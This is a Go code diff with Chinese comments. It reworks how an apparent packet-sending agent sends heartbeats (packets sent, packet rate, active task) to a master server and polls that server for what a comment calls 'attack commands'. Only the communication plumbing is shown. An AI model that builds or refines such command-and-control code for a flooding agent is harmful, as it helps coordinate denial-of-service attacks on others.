@@ -56,10 +56,14 @@ func sendHeartbeat() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		// 准备心跳数据，将serverId和apiKey移到请求体中，确保ID作为字符串
-		heartbeatData := map[string]interface{}{
-			"serverId":    fmt.Sprintf("%d", config.ServerID), // 转换为字符串
-			"apiKey":      config.APIKey,
+		// 使用map[string]string而非interface{}来避免转义问题
+		heartbeatData := map[string]string{
+			"serverId": fmt.Sprintf("%d", config.ServerID),
+			"apiKey":   config.APIKey,
+		}
+		
+		// 单独添加数值型数据
+		packetData := map[string]interface{}{
 			"packetsSent": atomic.LoadUint64(&packetsSent),
 			"packetsRate": atomic.LoadUint64(&packetsRate),
 		}
@@ -67,15 +71,24 @@ func sendHeartbeat() {
 		// 添加当前任务信息（如果有）
 		taskMutex.RLock()
 		if activeTask != nil {
-			heartbeatData["activeTaskId"] = activeTask.ID
+			packetData["activeTaskId"] = activeTask.ID
 		}
 		taskMutex.RUnlock()
+		
+		// 合并数据
+		completeData := make(map[string]interface{})
+		for k, v := range heartbeatData {
+			completeData[k] = v
+		}
+		for k, v := range packetData {
+			completeData[k] = v
+		}
 
-		// 构建心跳URL - 不再包含查询参数
+		// 构建心跳URL
 		heartbeatURL := fmt.Sprintf("%s/api/heartbeat", config.MasterURL)
 
 		// 编码请求数据
-		jsonData, err := json.Marshal(heartbeatData)
+		jsonData, err := json.Marshal(completeData)
 		if err != nil {
 			log.Printf("编码心跳数据失败: %v", err)
 			continue
@@ -93,11 +106,7 @@ func sendHeartbeat() {
 		// 设置请求头
 		req.Header.Set("Content-Type", "application/json")
 		
-		// 同时在URL参数中添加认证信息作为备用
-		q := req.URL.Query()
-		q.Add("serverId", fmt.Sprintf("%d", config.ServerID))
-		q.Add("apiKey", config.APIKey)
-		req.URL.RawQuery = q.Encode()
+		// 不再额外添加URL参数以避免特殊字符问题
 		
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
@@ -121,12 +130,12 @@ func sendHeartbeat() {
 // 监听攻击命令
 func listenForCommands() {
 	for {
-		// 构建命令URL和请求体 - 将serverId和apiKey作为JSON请求体
+		// 构建命令URL和请求体
 		commandURL := fmt.Sprintf("%s/api/commands", config.MasterURL)
 		
-		// 确保serverId作为字符串发送
-		requestData := map[string]interface{}{
-			"serverId": fmt.Sprintf("%d", config.ServerID), // 转换为字符串
+		// 使用map[string]string而非interface{}以避免不必要的转义
+		requestData := map[string]string{
+			"serverId": fmt.Sprintf("%d", config.ServerID),
 			"apiKey":   config.APIKey,
 		}
 		
@@ -150,11 +159,7 @@ func listenForCommands() {
 		// 设置请求头
 		req.Header.Set("Content-Type", "application/json")
 		
-		// 同时在URL参数中添加认证信息作为备用
-		q := req.URL.Query()
-		q.Add("serverId", fmt.Sprintf("%d", config.ServerID))
-		q.Add("apiKey", config.APIKey)
-		req.URL.RawQuery = q.Encode()
+		// 不再额外添加URL参数以避免特殊字符问题
 		
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
